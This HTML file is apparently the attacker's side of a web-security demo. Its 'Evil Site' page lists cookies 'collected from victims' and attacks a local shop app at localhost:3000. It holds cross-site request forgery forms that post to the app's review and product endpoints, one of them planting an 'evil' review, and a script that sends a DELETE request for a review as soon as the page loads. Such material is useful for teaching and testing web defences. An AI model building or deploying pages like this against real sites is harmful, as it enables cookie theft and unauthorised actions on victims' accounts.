<!doctype html>
<html lang="en">

<head>
    <title>Evil Site</title>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS v5.2.1 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous" />
</head>

<body>
    <header class="container-fluid py-3 bg-light text-center">
        <h1>We are collecting our victims' cookies</h1>
    </header>
    <main class="container py-3">
        <ol class="list-group list-group-numbered py-3" id="view">

        </ol>

        <form action="http://localhost:3000/reviews" method="post" class="text-center">
            <input type="hidden" name="id" value="51">
            <button type="submit" class="btn btn-primary">See more</button>
        </form>

        <form action="http://localhost:3000/products" method="post" class="text-center">
            <input type="hidden" name="id" value="12">
            <input class="btn btn-secondary mt-3" type="submit" name="review" id="review"
                value="Hello, this is a message from evil.">
        </form>

    </main>
    <footer>
        <!-- place footer here -->
    </footer>
    <!-- Bootstrap JavaScript Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
        crossorigin="anonymous"></script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
        integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+"
        crossorigin="anonymous"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.7.8/handlebars.min.js"
        integrity="sha512-E1dSFxg+wsfJ4HKjutk/WaCzK7S2wv1POn1RRPGh8ZK+ag9l244Vqxji3r6wgz9YBf6+vhQEYJZpSjqWFPg9gg=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <script id="template" type="text/x-handlbars-template">
        {{#each cookies}}
        <li class="list-group-item">{{this}}</li>
        {{/each}}
    </script>

    <script>
        async function getData() {
            let res = await fetch('/viewcookie');
            let json = await res.json();
            let source = document.querySelector('#template').innerHTML;
            let template = Handlebars.compile(source);
            // console.log(json);
            document.querySelector('#view').innerHTML = template({ cookies: json });
        }
        getData();
    </script>

    <script>
        async function deleteReview() {
            await fetch('http://localhost:3000/reviews',
                {
                    headers: {
                        'Content-type': 'application/json',
                    },
                    method: 'DELETE',
                    body: JSON.stringify({ id: 52 })
                });
        }
        deleteReview();
    </script>
</body>

</html>
